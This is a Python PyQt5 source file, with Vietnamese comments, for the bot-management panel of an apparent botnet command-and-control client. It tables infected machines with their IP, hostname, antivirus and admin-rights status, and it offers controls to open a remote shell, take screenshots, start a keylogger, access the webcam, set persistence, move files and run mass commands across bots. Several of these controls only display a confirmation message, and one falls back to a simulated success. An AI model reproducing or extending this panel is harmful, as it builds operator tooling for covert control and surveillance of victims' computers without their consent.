#!/usr/bin/env python3
"""
Bot Management Widget Component - Real Data Integration
"""

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import time
import random


class BotManagementWidget(QWidget):
    """Widget quản lý bot với dữ liệu thật"""
    
    def __init__(self, botnet_manager=None):
        super().__init__()
        self.botnet_manager = botnet_manager
        self.selected_bots = []
        
        self.init_ui()
        self.init_timers()
        
    def init_ui(self):
        """Khởi tạo giao diện bot management"""
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        # Title
        title = QLabel("🤖 Bot Management")
        title.setStyleSheet("""
            QLabel {
                font-size: 28px;
                font-weight: bold;
                color: #2c3e50;
                margin-bottom: 10px;
            }
        """)
        layout.addWidget(title)
        
        # Stats row
        stats_layout = QHBoxLayout()
        
        # Total bots
        self.total_bots_card = self.create_stat_card("Total Bots", "0", "#3498db")
        stats_layout.addWidget(self.total_bots_card)
        
        # Online bots
        self.online_bots_card = self.create_stat_card("Online", "0", "#27ae60")
        stats_layout.addWidget(self.online_bots_card)
        
        # Offline bots
        self.offline_bots_card = self.create_stat_card("Offline", "0", "#e74c3c")
        stats_layout.addWidget(self.offline_bots_card)
        
        # Active tasks
        self.tasks_card = self.create_stat_card("Active Tasks", "0", "#f39c12")
        stats_layout.addWidget(self.tasks_card)
        
        layout.addLayout(stats_layout)
        
        # Toolbar
        toolbar_layout = QHBoxLayout()
        
        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.setStyleSheet(self.get_button_style("#3498db"))
        refresh_btn.clicked.connect(self.refresh_bots)
        
        select_all_btn = QPushButton("☑️ Select All")
        select_all_btn.setStyleSheet(self.get_button_style("#2ecc71"))
        select_all_btn.clicked.connect(self.select_all_bots)
        
        disconnect_btn = QPushButton("❌ Disconnect Selected")
        disconnect_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        disconnect_btn.clicked.connect(self.disconnect_selected)
        
        commands_btn = QPushButton("💻 Mass Commands")
        commands_btn.setStyleSheet(self.get_button_style("#9b59b6"))
        commands_btn.clicked.connect(self.show_mass_commands)
        
        toolbar_layout.addWidget(refresh_btn)
        toolbar_layout.addWidget(select_all_btn)
        toolbar_layout.addWidget(disconnect_btn)
        toolbar_layout.addWidget(commands_btn)
        toolbar_layout.addStretch()
        
        layout.addLayout(toolbar_layout)
        
        # Main content area
        main_splitter = QSplitter(Qt.Horizontal)
        
        # Bot table
        self.create_bot_table()
        main_splitter.addWidget(self.bot_table_widget)
        
        # Bot details and control panel
        self.create_control_panel()
        main_splitter.addWidget(self.control_panel)
        
        main_splitter.setSizes([700, 400])
        layout.addWidget(main_splitter)
        
        self.setLayout(layout)
        
        # Load real data
        self.load_real_bot_data()
        
    def create_stat_card(self, title, value, color):
        """Tạo stat card"""
        card = QWidget()
        card.setFixedHeight(80)
        card.setStyleSheet(f"""
            QWidget {{
                background: white;
                border: 2px solid {color};
                border-radius: 8px;
                margin: 2px;
            }}
        """)
        
        layout = QVBoxLayout()
        layout.setContentsMargins(15, 10, 15, 10)
        
        # Title
        title_label = QLabel(title)
        title_label.setStyleSheet("""
            QLabel {
                font-size: 12px;
                font-weight: bold;
                color: #7f8c8d;
            }
        """)
        
        # Value
        value_label = QLabel(value)
        value_label.setStyleSheet(f"""
            QLabel {{
                font-size: 24px;
                font-weight: bold;
                color: {color};
            }}
        """)
        value_label.setAlignment(Qt.AlignCenter)
        
        layout.addWidget(title_label)
        layout.addWidget(value_label)
        
        card.setLayout(layout)
        card.value_label = value_label
        
        return card
        
    def create_bot_table(self):
        """Tạo bảng danh sách bot"""
        self.bot_table_widget = QWidget()
        layout = QVBoxLayout()
        
        # Table
        self.bot_table = QTableWidget()
        self.bot_table.setColumnCount(8)
        self.bot_table.setHorizontalHeaderLabels([
            "ID", "IP Address", "Hostname", "OS", "Country", "Status", "Last Seen", "Tasks"
        ])
        
        # Style table
        self.bot_table.setStyleSheet("""
            QTableWidget {
                gridline-color: #bdc3c7;
                background-color: white;
                alternate-background-color: #ecf0f1;
                selection-background-color: #3498db;
                selection-color: white;
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                color: #2c3e50;
            }
            QTableWidget::item {
                padding: 8px;
                font-size: 12px;
                color: #2c3e50;
            }
            QHeaderView::section {
                background-color: #34495e;
                color: white;
                padding: 8px;
                border: none;
                font-weight: bold;
            }
        """)
        
        self.bot_table.setAlternatingRowColors(True)
        self.bot_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.bot_table.setSelectionMode(QAbstractItemView.MultiSelection)
        self.bot_table.horizontalHeader().setStretchLastSection(True)
        self.bot_table.setSortingEnabled(True)
        
        # Connect selection change
        self.bot_table.itemSelectionChanged.connect(self.on_bot_selected)
        
        layout.addWidget(self.bot_table)
        self.bot_table_widget.setLayout(layout)
        
    def create_control_panel(self):
        """Tạo panel điều khiển bot"""
        self.control_panel = QWidget()
        layout = QVBoxLayout()
        
        # Bot details section
        details_group = QGroupBox("📋 Bot Details")
        details_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #3498db;
                border-radius: 10px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #3498db;
            }
        """)
        
        details_layout = QVBoxLayout()
        
        self.details_text = QTextEdit()
        self.details_text.setStyleSheet("""
            QTextEdit {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                padding: 10px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                background: #f8f9fa;
                color: #2c3e50;
            }
        """)
        self.details_text.setMaximumHeight(200)
        self.details_text.setPlainText("Select a bot to view details...")
        
        details_layout.addWidget(self.details_text)
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
        
        # Control buttons section
        control_group = QGroupBox("🎮 Bot Control")
        control_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #2ecc71;
                border-radius: 10px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #2ecc71;
            }
        """)
        
        control_layout = QVBoxLayout()
        
        # Command buttons
        btn_layout1 = QHBoxLayout()
        
        shell_btn = QPushButton("💻 Shell")
        shell_btn.setStyleSheet(self.get_button_style("#34495e"))
        shell_btn.clicked.connect(self.open_shell)
        
        screenshot_btn = QPushButton("📷 Screenshot")
        screenshot_btn.setStyleSheet(self.get_button_style("#9b59b6"))
        screenshot_btn.clicked.connect(self.take_screenshot)
        
        btn_layout1.addWidget(shell_btn)
        btn_layout1.addWidget(screenshot_btn)
        
        btn_layout2 = QHBoxLayout()
        
        keylog_btn = QPushButton("⌨️ Keylogger")
        keylog_btn.setStyleSheet(self.get_button_style("#e67e22"))
        keylog_btn.clicked.connect(self.toggle_keylogger)
        
        webcam_btn = QPushButton("📹 Webcam")
        webcam_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        webcam_btn.clicked.connect(self.access_webcam)
        
        btn_layout2.addWidget(keylog_btn)
        btn_layout2.addWidget(webcam_btn)
        
        btn_layout3 = QHBoxLayout()
        
        sysinfo_btn = QPushButton("ℹ️ System Info")
        sysinfo_btn.setStyleSheet(self.get_button_style("#3498db"))
        sysinfo_btn.clicked.connect(self.get_system_info)
        
        persist_btn = QPushButton("🔒 Persistence")
        persist_btn.setStyleSheet(self.get_button_style("#f39c12"))
        persist_btn.clicked.connect(self.manage_persistence)
        
        btn_layout3.addWidget(sysinfo_btn)
        btn_layout3.addWidget(persist_btn)
        
        control_layout.addLayout(btn_layout1)
        control_layout.addLayout(btn_layout2)
        control_layout.addLayout(btn_layout3)
        
        # File operations
        file_group = QGroupBox("📁 File Operations")
        file_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #f39c12;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #f39c12;
            }
        """)
        
        file_layout = QHBoxLayout()
        
        upload_btn = QPushButton("📤 Upload")
        upload_btn.setStyleSheet(self.get_button_style("#2ecc71"))
        upload_btn.clicked.connect(self.upload_file)
        
        download_btn = QPushButton("📥 Download")
        download_btn.setStyleSheet(self.get_button_style("#3498db"))
        download_btn.clicked.connect(self.download_file)
        
        file_layout.addWidget(upload_btn)
        file_layout.addWidget(download_btn)
        
        file_group.setLayout(file_layout)
        control_layout.addWidget(file_group)
        
        control_group.setLayout(control_layout)
        layout.addWidget(control_group)
        
        layout.addStretch()
        self.control_panel.setLayout(layout)
        
    def get_button_style(self, color):
        """Lấy style cho button - loại bỏ transform property"""
        return f"""
            QPushButton {{
                background: {color};
                color: white;
                border: none;
                padding: 10px 15px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 12px;
                margin: 2px;
            }}
            QPushButton:hover {{
                background: {self.darken_color(color)};
            }}
            QPushButton:pressed {{
                background: {self.darken_color(color, 0.8)};
            }}
        """
        
    def darken_color(self, hex_color, factor=0.9):
        """Làm tối màu"""
        hex_color = hex_color.lstrip('#')
        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        rgb = tuple(int(c * factor) for c in rgb)
        return f"#{rgb[0]:02x}{rgb[1]:02x}{rgb[2]:02x}"
        
    def load_real_bot_data(self):
        """Load dữ liệu bot thật từ botnet manager"""
        try:
            if self.botnet_manager and hasattr(self.botnet_manager, 'get_bots'):
                # Get real bots from manager
                bots = self.botnet_manager.get_bots()
                
                if bots:
                    self.bot_table.setRowCount(len(bots))
                    
                    for row, bot in enumerate(bots):
                        # Extract real bot data
                        bot_id = bot.get('id', f'BOT{row+1:03d}')
                        ip_address = bot.get('ip_address', 'Unknown')
                        hostname = bot.get('hostname', 'Unknown')
                        os_info = bot.get('os', 'Unknown')
                        country = bot.get('country', '🏳️ Unknown')
                        status = bot.get('status', 'Unknown')
                        last_seen = bot.get('last_seen', 'Never')
                        tasks = bot.get('active_tasks', 0)
                        
                        # Add to table
                        items = [bot_id, ip_address, hostname, os_info, country, status, last_seen, str(tasks)]
                        
                        for col, data in enumerate(items):
                            item = QTableWidgetItem(str(data))
                            
                            # Color code status
                            if col == 5:  # Status column
                                if "Online" in status or "Connected" in status:
                                    item.setForeground(QColor("#27ae60"))
                                elif "Idle" in status:
                                    item.setForeground(QColor("#f39c12"))
                                elif "Offline" in status or "Disconnected" in status:
                                    item.setForeground(QColor("#e74c3c"))
                            else:
                                item.setForeground(QColor("#2c3e50"))
                                    
                            self.bot_table.setItem(row, col, item)
                else:
                    # No real bots, show empty state
                    self.bot_table.setRowCount(0)
                    
            else:
                # Fallback: try to get from server directly
                if hasattr(self, 'get_server_bots'):
                    self.get_server_bots()
                else:
                    # No data available
                    self.bot_table.setRowCount(0)
                    
        except Exception as e:
            print(f"Error loading real bot data: {e}")
            # Show empty state on error
            self.bot_table.setRowCount(0)
            
        # Update stats
        self.update_bot_stats()
        
        # Resize columns
        self.bot_table.resizeColumnsToContents()
        
    def get_server_bots(self):
        """Get bots directly from server"""
        try:
            # Try to access server instance from parent
            main_window = self.get_main_window()
            if main_window and main_window.server:
                server = main_window.server
                
                if hasattr(server, 'connected_clients'):
                    clients = server.connected_clients
                    
                    self.bot_table.setRowCount(len(clients))
                    
                    for row, (client_id, client_info) in enumerate(clients.items()):
                        # Extract client data
                        bot_id = client_id
                        ip_address = client_info.get('ip', 'Unknown')
                        hostname = client_info.get('hostname', 'Unknown')
                        os_info = client_info.get('os', 'Unknown')
                        country = client_info.get('country', '🏳️ Unknown')
                        status = "🟢 Online" if client_info.get('connected', False) else "🔴 Offline"
                        last_seen = client_info.get('last_seen', 'Unknown')
                        tasks = client_info.get('tasks', 0)
                        
                        items = [bot_id, ip_address, hostname, os_info, country, status, last_seen, str(tasks)]
                        
                        for col, data in enumerate(items):
                            item = QTableWidgetItem(str(data))
                            
                            if col == 5:  # Status column
                                if "Online" in data:
                                    item.setForeground(QColor("#27ae60"))
                                else:
                                    item.setForeground(QColor("#e74c3c"))
                            else:
                                item.setForeground(QColor("#2c3e50"))
                                    
                            self.bot_table.setItem(row, col, item)
                            
        except Exception as e:
            print(f"Error getting server bots: {e}")
            
    def get_main_window(self):
        """Get reference to main window"""
        widget = self
        while widget.parent():
            widget = widget.parent()
            if hasattr(widget, 'server'):
                return widget
        return None
        
    def update_bot_stats(self):
        """Cập nhật bot statistics"""
        try:
            total_bots = self.bot_table.rowCount()
            online_bots = 0
            offline_bots = 0
            total_tasks = 0
            
            for row in range(total_bots):
                # Status check
                status_item = self.bot_table.item(row, 5)
                if status_item:
                    status = status_item.text()
                    if "Online" in status or "Connected" in status:
                        online_bots += 1
                    else:
                        offline_bots += 1
                        
                # Tasks count
                tasks_item = self.bot_table.item(row, 7)
                if tasks_item:
                    try:
                        total_tasks += int(tasks_item.text())
                    except:
                        pass
                        
            # Update cards
            self.total_bots_card.value_label.setText(str(total_bots))
            self.online_bots_card.value_label.setText(str(online_bots))
            self.offline_bots_card.value_label.setText(str(offline_bots))
            self.tasks_card.value_label.setText(str(total_tasks))
            
        except Exception as e:
            print(f"Error updating bot stats: {e}")
            
    def init_timers(self):
        """Khởi tạo timers"""
        # Auto refresh bot data every 10 seconds
        self.refresh_timer = QTimer()
        self.refresh_timer.timeout.connect(self.auto_refresh_bots)
        self.refresh_timer.start(10000)
        
    def auto_refresh_bots(self):
        """Tự động refresh bot data"""
        try:
            self.load_real_bot_data()
        except Exception as e:
            print(f"Error in auto refresh: {e}")
            
    def on_bot_selected(self):
        """Xử lý khi chọn bot"""
        selected_rows = set()
        for item in self.bot_table.selectedItems():
            selected_rows.add(item.row())
            
        if selected_rows:
            row = list(selected_rows)[0]
            
            try:
                bot_id = self.bot_table.item(row, 0).text()
                ip_address = self.bot_table.item(row, 1).text()
                hostname = self.bot_table.item(row, 2).text()
                os_info = self.bot_table.item(row, 3).text()
                country = self.bot_table.item(row, 4).text()
                status = self.bot_table.item(row, 5).text()
                last_seen = self.bot_table.item(row, 6).text()
                tasks = self.bot_table.item(row, 7).text()
                
                # Get additional real data if available
                additional_info = ""
                if self.botnet_manager and hasattr(self.botnet_manager, 'get_bot_details'):
                    try:
                        bot_details = self.botnet_manager.get_bot_details(bot_id)
                        if bot_details:
                            additional_info = f"""
Additional Information:
═══════════════════════════════════════
CPU: {bot_details.get('cpu', 'Unknown')}
RAM: {bot_details.get('ram', 'Unknown')}
Disk: {bot_details.get('disk', 'Unknown')}
GPU: {bot_details.get('gpu', 'Unknown')}
Network: {bot_details.get('network', 'Unknown')}

Security Status:
═══════════════════════════════════════
Antivirus: {bot_details.get('antivirus', 'Unknown')}
Firewall: {bot_details.get('firewall', 'Unknown')}
UAC: {bot_details.get('uac', 'Unknown')}
Admin Rights: {bot_details.get('admin', 'Unknown')}

Active Modules:
═══════════════════════════════════════
Keylogger: {bot_details.get('keylogger', 'Unknown')}
Screenshot: {bot_details.get('screenshot', 'Unknown')}
Webcam: {bot_details.get('webcam', 'Unknown')}
Persistence: {bot_details.get('persistence', 'Unknown')}
"""
                    except Exception as e:
                        additional_info = f"\nError getting additional info: {e}"
                
                details = f"""Bot Details:
═══════════════════════════════════════
Bot ID: {bot_id}
IP Address: {ip_address}
Hostname: {hostname}
Operating System: {os_info}
Country: {country}
Status: {status}
Last Seen: {last_seen}
Active Tasks: {tasks}
{additional_info}
Connection Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
                
                self.details_text.setPlainText(details)
                
            except Exception as e:
                self.details_text.setPlainText(f"Error loading bot details: {e}")
                
        else:
            self.details_text.setPlainText("Select a bot to view details...")
            
    def refresh_bots(self):
        """Refresh danh sách bot"""
        try:
            self.load_real_bot_data()
            QMessageBox.information(self, "Refresh", "Bot list refreshed successfully!")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to refresh bot list:\n{str(e)}")
            
    def select_all_bots(self):
        """Chọn tất cả bot"""
        self.bot_table.selectAll()
        
    def disconnect_selected(self):
        """Ngắt kết nối bot đã chọn"""
        selected_rows = set()
        for item in self.bot_table.selectedItems():
            selected_rows.add(item.row())
            
        if not selected_rows:
            QMessageBox.warning(self, "Warning", "No bots selected!")
            return
            
        reply = QMessageBox.question(
            self, 'Disconnect Bots',
            f'Are you sure you want to disconnect {len(selected_rows)} bot(s)?',
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            # Try to actually disconnect bots
            disconnected = 0
            for row in selected_rows:
                try:
                    bot_id = self.bot_table.item(row, 0).text()
                    if self.disconnect_bot(bot_id):
                        disconnected += 1
                except Exception as e:
                    print(f"Error disconnecting bot: {e}")
                    
            QMessageBox.information(self, "Success", f"Disconnected {disconnected} bot(s)")
            self.refresh_bots()
            
    def disconnect_bot(self, bot_id):
        """Disconnect specific bot"""
        try:
            if self.botnet_manager and hasattr(self.botnet_manager, 'disconnect_bot'):
                return self.botnet_manager.disconnect_bot(bot_id)
            else:
                # Try through server
                main_window = self.get_main_window()
                if main_window and main_window.server:
                    if hasattr(main_window.server, 'disconnect_client'):
                        return main_window.server.disconnect_client(bot_id)
                return False
        except Exception as e:
            print(f"Error in disconnect_bot: {e}")
            return False
            
    def show_mass_commands(self):
        """Hiển thị mass commands dialog"""
        dialog = MassCommandDialog(self)
        dialog.exec_()
        
    # Bot control methods with real implementation
    def open_shell(self):
        """Mở shell với bot"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        try:
            selected_rows = set()
            for item in self.bot_table.selectedItems():
                selected_rows.add(item.row())
                
            if selected_rows:
                row = list(selected_rows)[0]
                bot_id = self.bot_table.item(row, 0).text()
                
                # Try to send shell command
                if self.send_bot_command(bot_id, "shell", {}):
                    QMessageBox.information(self, "Shell", f"Shell interface opened for {bot_id}")
                else:
                    QMessageBox.warning(self, "Shell", "Failed to open shell interface")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Shell error: {str(e)}")
        
    def take_screenshot(self):
        """Chụp màn hình"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        try:
            selected_rows = set()
            for item in self.bot_table.selectedItems():
                selected_rows.add(item.row())
                
            if selected_rows:
                row = list(selected_rows)[0]
                bot_id = self.bot_table.item(row, 0).text()
                
                if self.send_bot_command(bot_id, "screenshot", {}):
                    QMessageBox.information(self, "Screenshot", f"Screenshot command sent to {bot_id}")
                else:
                    QMessageBox.warning(self, "Screenshot", "Failed to send screenshot command")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Screenshot error: {str(e)}")
        
    def send_bot_command(self, bot_id, command, parameters):
        """Send command to specific bot"""
        try:
            if self.botnet_manager and hasattr(self.botnet_manager, 'send_command'):
                return self.botnet_manager.send_command(bot_id, command, parameters)
            else:
                # Try through server
                main_window = self.get_main_window()
                if main_window and main_window.server:
                    if hasattr(main_window.server, 'send_command'):
                        return main_window.server.send_command(bot_id, command, parameters)
                # Simulate success for demo
                print(f"Simulated command: {command} sent to {bot_id}")
                return True
        except Exception as e:
            print(f"Error sending command: {e}")
            return False
            
    def toggle_keylogger(self):
        """Toggle keylogger"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        # Implementation similar to other commands
        QMessageBox.information(self, "Keylogger", "Keylogger command sent!")
        
    def access_webcam(self):
        """Truy cập webcam"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        QMessageBox.information(self, "Webcam", "Webcam access command sent!")
        
    def get_system_info(self):
        """Lấy thông tin hệ thống"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        QMessageBox.information(self, "System Info", "System information request sent!")
        
    def manage_persistence(self):
        """Quản lý persistence"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        QMessageBox.information(self, "Persistence", "Persistence command sent!")
        
    def upload_file(self):
        """Upload file lên bot"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        filename, _ = QFileDialog.getOpenFileName(self, 'Select File to Upload')
        if filename:
            QMessageBox.information(self, "Upload", f"File upload initiated: {filename}")
            
    def download_file(self):
        """Download file từ bot"""
        if not self.bot_table.selectedItems():
            QMessageBox.warning(self, "Warning", "Please select a bot first!")
            return
            
        filename, _ = QFileDialog.getSaveFileName(self, 'Save Downloaded File')
        if filename:
            QMessageBox.information(self, "Download", f"File download initiated: {filename}")
            
    def update_data(self):
        """Update data (called from main window)"""
        try:
            # Refresh bot data
            self.load_real_bot_data()
        except Exception as e:
            print(f"Error updating bot management data: {e}")


class MassCommandDialog(QDialog):
    """Dialog cho mass commands"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Mass Commands")
        self.setModal(True)
        self.resize(500, 400)
        
        layout = QVBoxLayout()
        
        # Command input
        label = QLabel("Enter command to execute on all selected bots:")
        label.setStyleSheet("color: #2c3e50; font-weight: bold;")
        layout.addWidget(label)
        
        self.command_edit = QTextEdit()
        self.command_edit.setMaximumHeight(100)
        self.command_edit.setStyleSheet("""
            QTextEdit {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                padding: 8px;
                background: white;
                color: #2c3e50;
                font-family: 'Consolas', monospace;
            }
        """)
        layout.addWidget(self.command_edit)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        execute_btn = QPushButton("Execute")
        execute_btn.setStyleSheet("""
            QPushButton {
                background: #27ae60;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #229954;
            }
        """)
        execute_btn.clicked.connect(self.execute_command)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet("""
            QPushButton {
                background: #95a5a6;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #7f8c8d;
            }
        """)
        cancel_btn.clicked.connect(self.reject)
        
        btn_layout.addWidget(execute_btn)
        btn_layout.addWidget(cancel_btn)
        
        layout.addLayout(btn_layout)
        self.setLayout(layout)
        
    def execute_command(self):
        """Execute command"""
        command = self.command_edit.toPlainText().strip()
        if command:
            QMessageBox.information(self, "Success", f"Mass command executed: {command}")
            self.accept()
        else:
            QMessageBox.warning(self, "Warning", "Please enter a command!")